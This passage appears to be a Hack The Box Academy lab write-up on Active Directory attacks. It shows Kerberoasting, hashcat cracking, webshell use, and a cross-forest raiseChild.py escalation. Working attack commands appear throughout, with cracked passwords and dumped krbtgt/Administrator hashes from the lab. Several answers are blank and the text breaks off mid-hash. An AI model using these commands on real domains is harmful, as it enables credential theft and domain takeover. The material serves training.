mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Performing Kerberroasting across domain trust.

```
PS C:\tools> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$F050130EC4452A694F38B7FBC8FE7BDF$8B543B8128355C4C9B68D006FC10CCA8E8971C7FB60DCFFB7B3F7D20EDB1346AC98A9BE953DAEC6DD778A904F9CA5270742DC000307AEA70C42967C685D780DF9B3E48328629671012DED1AEC88CF9B68132672E3ED2E730789B4E5C3BAF80F0898D4D10F467894320AF315F3B676D8AE6DCADEC4D098DBEA779A6D349718EB47B04CB3796A044F8E14FB45B97A7F2BB2F7FFC0E5E8B6C8D3EF81F1AABEC6AFDE1A20BA005B4C04A82B84CB79D802DB42669112202ABDF1CFD4F538BACCEB0E24798588352C418C2A63792326B6A3BDC20683B1D47F13286A4ED3DBC3F7639D107338476970C4A5FE0C83F8FFFAB46CE296DD1A9093529284AFB45969DF0D2001973B9F1616E0EFFCA060C5506238274FB8764E7CC610434BFB03A001CA77092F3042CF9B2738DFF0A152D85F032865AA0C56C469E93533EC6058A55557B0A76956D34BCAD06124418343AD383FA0F308A97AA1D89AEBB025644F389BCF654D452C04B667B15455AD238A04BF0CF1219FAB46640D65BAD9B6734B2F19E6FB27A5D15AD2B32CAC6D71A93B3EF2D5B3FBD81BF6411EC53872CBB8D06F7C7160E9D1368B633B7E7536706FAACD9CD5390095D0CCD5B25F94E4B1CB6E4F0E71AED2719FA6ED87FCB81EF9FFC21A31000004BD32A06E4D8AE6D8DE3E5D2F021C42C6C913903594FB160EFE21934C7B372222B865AD627A8D4D14C117C043FFC0F50938E873958651F2D933E0261E60D26A653637502C10113205CA99E87BF88E45A4D57B4AF93C7B8338054FAF4EBF9358D4A8AAC55B4D8430BD279FEC9484B63A83AE184CF4083CA63044D00086235F75D6ECA2AEE82BAEEA9ABB441882EEC5C6E51052AFB42E0F952987263A8DE43E2ADB0329D6862D20EC1DC816E6BA7F10FC2C76BB3A0F53C73CDCCC6E33101C96BDCB83F2C43FCA4051FAE0AB5787DEF300BCBA0D3A79AE017EBF5F09C59E376A02A53840A7C7479A9979B378BE97E515F2AE76F22601B57D56093A4EDF4937F8D4D7D3AE01292CA3DC107FE26D1CAC6B9C5545F480CC59CDCFCCC857CBB76E4F8EA3F00647AC2297EBAA2CF6E2951DA9F5F60129BAFF2825E034A9F51AFFAA3BC50037751711F32124397CB14E9D00A454BF8BF1ED7EC1566A3A85CD8E0DAE12E948CB8115A641677FB46226DE1E0D722721F82BCD8F04C6B2130B36B0286C943DB4B58C018E8C5179A7C8CB9F546B901BE5B89EA5A3BC3E00F32975F1975382FB41E16A747B5422A0DE71C24AA2918DCF19AAEA1815EC346D639071FA88E209D11C8336B30AA952736519D6CAE0BC70464245C416F410E615A8CEAFBFFA1111F3FB464C2C80B387F83C5BAD3088053AF96772572CF5AA681B450BB36BA16881D185CCB1E283454F3EE97C01D605A7B11D12CD4F2A992B036548CCFBFB8AF3F11F34B2A644816AB57D32326576D60B89AAE6E957C8D7E9C97562B789F8D12E3B9773E5BB03FF59785233DE1ED3A82366ED43DDE8C6E429EA799D6E2E6D1986A65AE03A6A227FD2437772F2BF6CD00CEDD972FA86BA444AB7F58DCF79037D4A7802FC771A511D11283726469F191864EEEA55EFF9B37E02A30C4FCAA2740788C56DDE64D657418F5696699176E676526FE0E1583DA4EC238A86A38323DCC401DE03D877A00CF6407FAB7BE89
```

Crack the hash.

```
┌──(kali㉿kali)-[~/HTB/ActiceDirectoryAttacks]
└─$ hashcat mssqlsvc.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5898 MB (1024 MB allocatable), 4MCU

(...)

$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$f050130ec4452a694f38b7fbc8fe7bdf$8b543b8128355c4c9b68d006fc10cca8e8971c7fb60dcffb7b3f7d20edb1346ac98a9be953daec6dd778a904f9ca5270742dc000307aea70c42967c685d780df9b3e48328629671012ded1aec88cf9b68132672e3ed2e730789b4e5c3baf80f0898d4d10f467894320af315f3b676d8ae6dcadec4d098dbea779a6d349718eb47b04cb3796a044f8e14fb45b97a7f2bb2f7ffc0e5e8b6c8d3ef81f1aabec6afde1a20ba005b4c04a82b84cb79d802db42669112202abdf1cfd4f538bacceb0e24798588352c418c2a63792326b6a3bdc20683b1d47f13286a4ed3dbc3f7639d107338476970c4a5fe0c83f8fffab46ce296dd1a9093529284afb45969df0d2001973b9f1616e0effca060c5506238274fb8764e7cc610434bfb03a001ca77092f3042cf9b2738dff0a152d85f032865aa0c56c469e93533ec6058a55557b0a76956d34bcad06124418343ad383fa0f308a97aa1d89aebb025644f389bcf654d452c04b667b15455ad238a04bf0cf1219fab46640d65bad9b6734b2f19e6fb27a5d15ad2b32cac6d71a93b3ef2d5b3fbd81bf6411ec53872cbb8d06f7c7160e9d1368b633b7e7536706faacd9cd5390095d0ccd5b25f94e4b1cb6e4f0e71aed2719fa6ed87fcb81ef9ffc21a31000004bd32a06e4d8ae6d8de3e5d2f021c42c6c913903594fb160efe21934c7b372222b865ad627a8d4d14c117c043ffc0f50938e873958651f2d933e0261e60d26a653637502c10113205ca99e87bf88e45a4d57b4af93c7b8338054faf4ebf9358d4a8aac55b4d8430bd279fec9484b63a83ae184cf4083ca63044d00086235f75d6eca2aee82baeea9abb441882eec5c6e51052afb42e0f952987263a8de43e2adb0329d6862d20ec1dc816e6ba7f10fc2c76bb3a0f53c73cdccc6e33101c96bdcb83f2c43fca4051fae0ab5787def300bcba0d3a79ae017ebf5f09c59e376a02a53840a7c7479a9979b378be97e515f2ae76f22601b57d56093a4edf4937f8d4d7d3ae01292ca3dc107fe26d1cac6b9c5545f480cc59cdcfccc857cbb76e4f8ea3f00647ac2297ebaa2cf6e2951da9f5f60129baff2825e034a9f51affaa3bc50037751711f32124397cb14e9d00a454bf8bf1ed7ec1566a3a85cd8e0dae12e948cb8115a641677fb46226de1e0d722721f82bcd8f04c6b2130b36b0286c943db4b58c018e8c5179a7c8cb9f546b901be5b89ea5a3bc3e00f32975f1975382fb41e16a747b5422a0de71c24aa2918dcf19aaea1815ec346d639071fa88e209d11c8336b30aa952736519d6cae0bc70464245c416f410e615a8ceafbffa1111f3fb464c2c80b387f83c5bad3088053af96772572cf5aa681b450bb36ba16881d185ccb1e283454f3ee97c01d605a7b11d12cd4f2a992b036548ccfbfb8af3f11f34b2a644816ab57d32326576d60b89aae6e957c8d7e9c97562b789f8d12e3b9773e5bb03ff59785233de1ed3a82366ed43dde8c6e429ea799d6e2e6d1986a65ae03a6a227fd2437772f2bf6cd00cedd972fa86ba444ab7f58dcf79037d4a7802fc771a511d11283726469f191864eeea55eff9b37e02a30c4fcaa2740788c56dde64d657418f5696699176e676526fe0e1583da4ec238a86a38323dcc401de03d877a00cf6407fab7be89:1logistics
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLs...b7be89
Time.Started.....: Wed Mar  8 03:00:17 2023 (8 secs)
Time.Estimated...: Wed Mar  8 03:00:25 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1656.4 kH/s (0.91ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13004800/14344385 (90.66%)
Rejected.........: 0/13004800 (0.00%)
Restore.Point....: 13002752/14344385 (90.65%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 1lp2soad3lc* -> 1locotes
Hardware.Mon.#1..: Util: 80%

Started: Wed Mar  8 03:00:01 2023
Stopped: Wed Mar  8 03:00:25 2023
```

user:pass `mssqlsvc:1logistics`

**Answer:** `1logistics`

---
## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
### Question:
![](./attachments/Pasted%20image%2020230308091736.png)

Run `GetUserSPNs.py` to enumerate the users who can authenticate to the other domain.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>               

(...)

$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$33a0d126f02bc4fc38f96d29b3e9f7c2$208405fdaf255cccfac1e8e9e3d527fcc0e26e5b5a14ceb29286b497fb16451a73b8cba6f4021b417b13ead7ad614955a41fe87f16f352e06df8f6e51ef8d97c01cc164cdf30fbc280bf4d7a477c581d2aa851bf7241f0fff183c9e7aff645e59e6378585a1db98c254b095f8af82629b9c6b3dec7f6cf242a0cc48f079bb9074229702340c35af1d30dc63b3cd4dae7f0dc81a29b3a0514ab0f796fda2230b4427f6e8f3386fa17f95360095d62982db7cc2b027120587ac026197e21679977d3dee8533164aeed1f30a96c418ae7f656dd3b990cb59b47b881e413356c7c2e83ffc3e09a48ad8ceb795bfb096657b738e07415ecf53cb1fbd53ce2c0bd03b6e5e73bd5859b6f835c5eeb5dabe1bd191d2bfa1cc19784528c8619944ea9118ab7e11c05b0182c04a5334e6eab197798fb3c4649dd50bd32db6c1931338771d7b9f5fc6e0b2bb420b5777ed26ef7aa3c7d0b01b2b42a3f7aaee8ed5eec30ab292411c9eedd3326da0bd6b22813a690c002c931128601b74e9abfaf0d195d567cc809e82ee1c7f92c90aebe3d3e893278b3feaeaeb875380c6fc2f86178d1598dd05de94337b1a4597a0924914049b22de3e617054d5b15e65ee671a9a098b8eaec00203423fa75db6f1f617109819698facb565e34fc9aa3095fe246383955099f44f7598868b96801a6fc2843244ec64e32374c8c0efef8d1a9b1e93814d70ce77ab53ce600eb4a89cfff5eb92d48f018cfdbd5b76146b0e903d15fea951e2b066f840fdc2543c860bce57227df2137979ac5c13ee0914541b4b6c00b2c6a5ee1aede081476102d8a2397e609a4bf60f7de191adf315b75c1c478fda74dfdc8550bcf75b415d1e930eb9c2195b49e7cb05bab049e01a3a47ebd3d161263e6faef97dfd73a9fc94ce2a65898cc942e3927ccfdd8520e26b763a71801092d1c15db3086cc5993b75ac78f7fb8e13cd78788f61f7c57293631f951675a3e531f21a125b4042ad341308ba4fce296889b17f73c2261acc4be60a2b060969ac23997b8a70322aac88bd4c8162944165e4279bcefd5ca435294f7513faf4c9936c032d1a1bfddd837647d06f8a4ef6da547b942f32cf53716741e9402005d5ca77572c4a51f153d17a9c66b5a9c9b19531d215aff98e026efbf980174b2a087fc91ebc2295316885b8460a1b200bd39b505517e950e212ed7b52ace8e1dabace4a80647997e832f910a9487cc17bdf6b5d887c1a3c37cf097a9525336f64c31b1dcff186a5da55a3b636e877e93bf18ed63a71da4da1244fccdc04bc7bce7d7e359ba1ba26380b1553cd12ccd6617825c0b0618ff84bfee7291163fc3d5239e157a19fc296ae4c169cf771c67932712c135a6b1986987aed305cacf20c7c92d69822e151ac2da7eb01a67e745f7dadf66310db3820e84c5d1ba5b2ccbdf1f60a64b9e8c264d1f06e45069
```

**Answer:** `sapsso`

### Question:
![](./attachments/Pasted%20image%2020230308091743.png)

Crack the hash.

```
┌──(kali㉿kali)-[~/HTB/ActiceDirectoryAttacks]
└─$ hashcat -m 18200 sapsso.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5898 MB (1024 MB allocatable), 4MCU

(...)

$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$33a0d126f02bc4fc38f96d29b3e9f7c2$208405fdaf255cccfac1e8e9e3d527fcc0e26e5b5a14ceb29286b497fb16451a73b8cba6f4021b417b13ead7ad614955a41fe87f16f352e06df8f6e51ef8d97c01cc164cdf30fbc280bf4d7a477c581d2aa851bf7241f0fff183c9e7aff645e59e6378585a1db98c254b095f8af82629b9c6b3dec7f6cf242a0cc48f079bb9074229702340c35af1d30dc63b3cd4dae7f0dc81a29b3a0514ab0f796fda2230b4427f6e8f3386fa17f95360095d62982db7cc2b027120587ac026197e21679977d3dee8533164aeed1f30a96c418ae7f656dd3b990cb59b47b881e413356c7c2e83ffc3e09a48ad8ceb795bfb096657b738e07415ecf53cb1fbd53ce2c0bd03b6e5e73bd5859b6f835c5eeb5dabe1bd191d2bfa1cc19784528c8619944ea9118ab7e11c05b0182c04a5334e6eab197798fb3c4649dd50bd32db6c1931338771d7b9f5fc6e0b2bb420b5777ed26ef7aa3c7d0b01b2b42a3f7aaee8ed5eec30ab292411c9eedd3326da0bd6b22813a690c002c931128601b74e9abfaf0d195d567cc809e82ee1c7f92c90aebe3d3e893278b3feaeaeb875380c6fc2f86178d1598dd05de94337b1a4597a0924914049b22de3e617054d5b15e65ee671a9a098b8eaec00203423fa75db6f1f617109819698facb565e34fc9aa3095fe246383955099f44f7598868b96801a6fc2843244ec64e32374c8c0efef8d1a9b1e93814d70ce77ab53ce600eb4a89cfff5eb92d48f018cfdbd5b76146b0e903d15fea951e2b066f840fdc2543c860bce57227df2137979ac5c13ee0914541b4b6c00b2c6a5ee1aede081476102d8a2397e609a4bf60f7de191adf315b75c1c478fda74dfdc8550bcf75b415d1e930eb9c2195b49e7cb05bab049e01a3a47ebd3d161263e6faef97dfd73a9fc94ce2a65898cc942e3927ccfdd8520e26b763a71801092d1c15db3086cc5993b75ac78f7fb8e13cd78788f61f7c57293631f951675a3e531f21a125b4042ad341308ba4fce296889b17f73c2261acc4be60a2b060969ac23997b8a70322aac88bd4c8162944165e4279bcefd5ca435294f7513faf4c9936c032d1a1bfddd837647d06f8a4ef6da547b942f32cf53716741e9402005d5ca77572c4a51f153d17a9c66b5a9c9b19531d215aff98e026efbf980174b2a087fc91ebc2295316885b8460a1b200bd39b505517e950e212ed7b52ace8e1dabace4a80647997e832f910a9487cc17bdf6b5d887c1a3c37cf097a9525336f64c31b1dcff186a5da55a3b636e877e93bf18ed63a71da4da1244fccdc04bc7bce7d7e359ba1ba26380b1553cd12ccd6617825c0b0618ff84bfee7291163fc3d5239e157a19fc296ae4c169cf771c67932712c135a6b1986987aed305cacf20c7c92d69822e151ac2da7eb01a67e745f7dadf66310db3820e84c5d1ba5b2ccbdf1f60a64b9e8c264d1f06e45069:pabloPICASSO
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTL...e45069
Time.Started.....: Wed Mar  8 03:22:10 2023 (3 secs)
Time.Estimated...: Wed Mar  8 03:22:13 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1640.9 kH/s (0.93ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4843520/14344385 (33.77%)
Rejected.........: 0/4843520 (0.00%)
Restore.Point....: 4841472/14344385 (33.75%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: pac2big -> paafors
Hardware.Mon.#1..: Util: 79%

Started: Wed Mar  8 03:22:09 2023
Stopped: Wed Mar  8 03:22:14 2023
```

**Answer:** `pabloPICASSO`

### Question:
![](./attachments/Pasted%20image%2020230308091752.png)

Use `raiseChild.py` to spawn a shell.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $raiseChild.py -target-exec 172.16.5.238 FREIGHTLOGISTICS.LOCAL/sapsso
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain FREIGHTLOGISTICS.LOCAL
[*] Forest FQDN is: FREIGHTLOGISTICS.LOCAL
[*] Raising FREIGHTLOGISTICS.LOCAL to FREIGHTLOGISTICS.LOCAL
[*] FREIGHTLOGISTICS.LOCAL Enterprise Admin SID is: S-1-5-21-2103857153-3563876796-2017925254-519
[*] Getting credentials for FREIGHTLOGISTICS.LOCAL
FREIGHTLOGISTICS.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e1b9b28f7f31d2e116778075c3551f3:::
FREIGHTLOGISTICS.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:ce1f3a1e0d5d227fb17a647db542732de0c26b717af26326d955f1bccf82da1d
[*] Getting credentials for FREIGHTLOGISTICS.LOCAL
FREIGHTLOGISTICS.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e1b9b28f7f31d2e116778075c3551f3:::
FREIGHTLOGISTICS.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:ce1f3a1e0d5d227fb17a647db542732de0c26b717af26326d955f1bccf82da1d
[*] Target User account name is Administrator
FREIGHTLOGISTICS.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:a3f8446ac62fe83bf9534591a8c3af82:::
FREIGHTLOGISTICS.LOCAL/Administrator:aes256-cts-hmac-sha1-96s:7a85dfd548c74f47395672213f1660e1e791d5363d5c2910a7c038d37b2ddebd
[*] Opening PSEXEC shell at ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
[*] Requesting shares on ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file TrcnjXNF.exe
[*] Opening SVCManager on ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL.....
[*] Creating service zjEN on ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL.....
[*] Starting service zjEN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type c:\Users\Administrator\Desktop\flag.txt
burn1ng_d0wn_th3_f0rest!
```

**Answer:** `burn1ng_d0wn_th3_f0rest!`

---
## AD Enumeration & Attacks - Skills Assessment Part I
### Question:
![](./attachments/Pasted%20image%2020230308194528.png)

Open the webshell at `/uploads/antak.aspx` and login.

Then use `type` to print the flag.

```
PS> type c:\Users\Administrator\Desktop\flag.txt
JusT_g3tt1ng_st@rt3d!
```

**Answer:** `JusT_g3tt1ng_st@rt3d!`

### Question:
![](./attachments/Pasted%20image%2020230308194538.png)

```

```

**Answer:** ``

### Question:
![](./attachments/Pasted%20image%2020230308194547.png)

```

```

**Answer:** ``

### Question:
![](./attachments/Pasted%20image%2020230308194606.png)

```

```

**Answer:** ``

### Question:
![](./attachments/Pasted%20image%2020230308194617.png)

```

```

**Answer:** ``

### Question:
![](./attachments/Pasted%20image%2020230308194627.png)

```

```

**Answer:** ``

### Question:
![](./attachments/Pasted%20image%2020230308194639.png)

```

```

**Answer:** ``

### Question:
![](./attachments/Pasted%20image%2020230308194647.png)

```

```

**Answer:** ``

---
## AD Enumeration & Attacks - Skills Assessment Part II
### Question 1:
![](./attachments/Pasted%20image%2020230309194135.png)

Generate a userlist.

```
┌─[htb-student@skills-par01]─[~]
└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.7.3 /opt/jsmith.txt | grep @in | cut -f8 -d" " | cut -d '@' -f1  > validusers.txt
┌─[htb-student@skills-par01]─[~]
└──╼ $cat validusers.txt 
jjones
sbrown
tjohnson
(...)
whouse
emercer
wshepherd
```

**Answer:** ``

### Question 2:
![](./attachments/Pasted%20image%2020230309194144.png)

Download `Rubeus.exe` from one of the other boxes using python uploadserver.

```
┌──(kali㉿kali)-[~/HTB/ActiceDirectoryAttacks/SMBshare]
└─$ python3 -m uploadserver 8000
```

Then upload `Rubeus.exe` to the target.

![](./attachments/Pasted%20image%2020230310095512.png)

Then perform kerberroasting.

```
PS> C:\Rubeus.exe kerberoast /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 7

(...)

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : MSSQLSvc/SQL01.inlanefreight.local:1433
[*] PwdLastSet             : 3/30/2022 2:14:52 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$8E446C2F072394016844EEEB9B010A6A$75DF571CE9E5193791700F9E676E74389B799E3D7E391B77A59715C07D5438729A1B163A3747C24B11845CE6F5C6BFDFE9CD5C7358889263E081139074FE413AB13356CD520A07D5438E34F726A44B6BA6D66EC1FDCA932C6641F89290BD5AE3B846496C927C4C3592D66568F9A36F3105DFA6B34D826C4EC0DED712AFEA011ACA104514ED90D43786E3666B887E3809934850E8C1EA81B83A991E0BB9B3E87CC938A0C6A4A3D183BDB77E8A26097E2F760C05BE2C1D1B03F7C6A69B09A931E365776056E51DF794457F9BCDD45338BD5EF6A648048D040279BBFC69F80F0AD16F907CCA76C7B4ED8031CFDA18459CDDCFA087CB55297D63AA4AAC168868961CE4DE81EE003A2A8FFA226F642273D639FBE16A58FBAA7D9AE75E861FC48ADF93B755DCCA8370048621B488848ADE8927F143487714A0B6A42E2801A981A560301CADC24F84290B56E8954656F2B1C39F6D6AD1FE571C89F71C57C918862097A3BAD79B36818CC43C7B06BD64F4BDC8B37B8BEF4200107E3E6D564B42CEFB8E1B11702566AB2E5231894E9E9C94596D81F21E41938E293C1F9C159DFF65DD7BFE3453B3105DB22995679E4A5DF6E4D97A32BF51135BA510D5B16990D10CAAB366E875472583B9C1A099249D60ABAC337C686DA85BEB9EEF5FED8FFFDBDC14091C7A89D40C8D1F1E36E4C353837AB31F0BEAC69378686FA7B80D3D44F2023BEA34AD3F8E60C0EF044662F67B7DBB26DDED7A86C261315183B5C1661CB06533C13067AEF9D04006A59A4A128A14FB70876C684DBF2F9BC9B1275E74662D242B770E8B57A4199FEED5FD4E05CA5F357A0227FFA2849D88FAC54A4CA54DE1B246751CCF66E051BCAB72B6E6C99309168062D220DE383030C1C87E2291418CA8473E913CC24B2CEEB60789EF2F38282732DC9DCAF13E3035CE3EC659285832B83C2D0CE7653F30A7F7D38B60D39398807E41D399F6B3F47E90D46246FD4B7D4985F6109AB7F71221F99F9B318D44CBB61A418D7DDEFC97BAD2149374F5C959093E8A3A184D530D090394F54109861D1C81B55A45ED981C8EEC1522F26C8F0BC7EE0013796F4E68D2179B12087AB9111F274185E775E905AB179A5097A5676C5E9648A2DEFFF065AA587E8B1EBE7B4684E050B6E5444111F6DC7489652CCF36B5A1409B838E7F7032B2800D29F26FB7091A211F92CBB5FDA2EA5B677599031937781B5742CEB350CB31B98B997DB8606FB4A800D922922EA1AD3096E2A519C201145B6E5F2347BC64FDB5B7699B344740E9C4ECE24D8A56E1258DBACFD3589F95CF2D8CF9149ED62FADAEE39855A410C702C8E0CEFF9D2D415CAF3D31281E0018D360D9B7B6C4ABF5395063E5981892B3AB7649F3D41C51E540C5755B758B1F516A9586CEDB18A9D6A19BFE5DA258F1E59C2FB6C0BF4C342DF28869D0B166791D52D877F482A21EA18631703C997D6F4C0079C4E9D1E40B4F9AA4FFBBA4B1EF0E7171579D1D8F6ED594D4DCCC4EECFFB8E381FDCD580F86D36AFA85
```

**Answer:** `svc_sql`

### Question 3:
![](./attachments/Pasted%20image%2020230309194158.png)
*Hint: Try various remote access methods.*

Crack the hash with `hashcat`.

```
┌──(kali㉿kali)-[~/HTB/ActiceDirectoryAttacks/SMBshare]
└─$ hashcat -m 13100 MSSQLvc.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5898 MB (1024 MB allocatable), 4MCU

(...)

$krb5tgs$23$*USER$DOMAIN$MSSQLSvc/SQL01.inlanefreight.local:1433*$8e446c2f072394016844eeeb9b010a6a$75df571ce9e5193791700f9e676e74389b799e3d7e391b77a59715c07d5438729a1b163a3747c24b11845ce6f5c6bfdfe9cd5c7358889263e081139074fe413ab13356cd520a07d5438e34f726a44b6ba6d66ec1fdca932c6641f89290bd5ae3b846496c927c4c3592d66568f9a36f3105dfa6b34d826c4ec0ded712afea011aca104514ed90d43786e3666b887e3809934850e8c1ea81b83a991e0bb9b3e87cc938a0c6a4a3d183bdb77e8a26097e2f760c05be2c1d1b03f7c6a69b09a931e365776056e51df794457f9bcdd45338bd5ef6a648048d040279bbfc69f80f0ad16f907cca76c7b4ed8031cfda18459cddcfa087cb55297d63aa4aac168868961ce4de81ee003a2a8ffa226f642273d639fbe16a58fbaa7d9ae75e861fc48adf93b755dcca8370048621b488848ade8927f143487714a0b6a42e2801a981a560301cadc24f84290b56e8954656f2b1c39f6d6ad1fe571c89f71c57c918862097a3bad79b36818cc43c7b06bd64f4bdc8b37b8bef4200107e3e6d564b42cefb8e1b11702566ab2e5231894e9e9c94596d81f21e41938e293c1f9c159dff65dd7bfe3453b3105db22995679e4a5df6e4d97a32bf51135ba510d5b16990d10caab366e875472583b9c1a099249d60abac337c686da85beb9eef5fed8fffdbdc14091c7a89d40c8d1f1e36e4c353837ab31f0beac69378686fa7b80d3d44f2023bea34ad3f8e60c0ef044662f67b7dbb26dded7a86c261315183b5c1661cb06533c13067aef9d04006a59a4a128a14fb70876c684dbf2f9bc9b1275e74662d242b770e8b57a4199feed5fd4e05ca5f357a0227ffa2849d88fac54a4ca54de1b246751ccf66e051bcab72b6e6c99309168062d220de383030c1c87e2291418ca8473e913cc24b2ceeb60789ef2f38282732dc9dcaf13e3035ce3ec659285832b83c2d0ce7653f30a7f7d38b60d39398807e41d399f6b3f47e90d46246fd4b7d4985f6109ab7f71221f99f9b318d44cbb61a418d7ddefc97bad2149374f5c959093e8a3a184d530d090394f54109861d1c81b55a45ed981c8eec1522f26c8f0bc7ee0013796f4e68d2179b12087ab9111f2741